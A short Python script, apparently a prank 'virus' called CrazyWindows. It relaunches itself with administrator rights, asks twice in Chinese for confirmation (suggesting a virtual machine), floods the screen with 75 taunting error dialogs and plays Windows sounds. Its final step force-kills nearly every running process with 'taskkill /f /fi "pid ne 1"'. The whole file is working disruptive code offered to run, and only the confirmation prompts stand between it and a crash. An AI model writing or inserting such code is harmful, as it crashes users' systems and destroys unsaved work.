from tkinter import messagebox as m
import tkinter as tk
import os
import threading
import time
import winsound
import ctypes, sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    ra=m.askokcancel("CrazyWindows","你要运行这个病毒吗?")
    if ra==True:
        ra2=m.askokcancel("CrayzyWindows","确定?(建议在虚拟机上运行)")
        if ra2==True:
            w=0
            def e1():
                m.showerror("dead","you computer is dead")
            def e2():
                m.showwarning("dead","you need ?? you computer")
            def e3():
                m.showinfo("dead","you computer is killed by me :D")
            threads=0
            for w in range(25):
                t=threading.Thread(target=e1)
                time.sleep(0.75)
                t.start()
            w=0
            for w in range(25):
                t=threading.Thread(target=e2)
                time.sleep(0.75)
                t.start()
            w=0
            for w in range(25):
                t=threading.Thread(target=e3)
                time.sleep(0.75)
                t.start()
            winsound.PlaySound("C:/Windows/Media/Windows Notify Calendar.wav",winsound.SND_FILENAME)
            winsound.PlaySound('C:/Windows/Media/Windows Hardware Insert.wav', winsound.SND_FILENAME)
            winsound.PlaySound('C:/Windows/Media/Windows Hardware Fail.wav', winsound.SND_FILENAME)
            winsound.PlaySound('C:/Windows/Media/Windows Hardware Remove.wav', winsound.SND_FILENAME)
            winsound.PlaySound('C:/Windows/Media/Windows Notify System Generic.wav', winsound.SND_FILENAME)
            os.system('taskkill /f /fi "pid ne 1"')
        else:
            exit()
    else:
        exit()

else:
    # 以管理员权限重新运行程序
    ctypes.windll.shell32.ShellExecuteW(None,"runas", sys.executable, __file__, None, 1)
